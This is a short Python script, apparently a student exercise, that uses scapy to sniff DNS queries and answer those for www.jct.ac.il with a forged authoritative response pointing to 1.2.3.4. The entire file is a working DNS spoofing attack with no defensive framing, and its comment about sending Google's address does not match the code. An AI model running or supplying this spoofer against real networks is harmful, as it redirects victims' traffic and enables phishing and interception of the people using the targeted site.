from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import UDP, IP
from scapy.sendrecv import sniff, send


# callback function for DNS packet sniffing
def dns_callback(pkt):
    # check if the packet is a DNS query
    if pkt.haslayer(DNSQR):
        query = pkt[DNSQR].qname.decode()



        if 'www.jct.ac.il' in query:
            print('its reel site')
            # create a spoofed DNS response packet that send the ip of google.com
            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                   UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                   DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                       an=DNSRR(rrname=query, ttl=10, rdata='1.2.3.4'))

            # send response
            send(resp)


# start sniffing with a filter for DNS queries
sniff(filter='udp port 53', prn=dns_callback)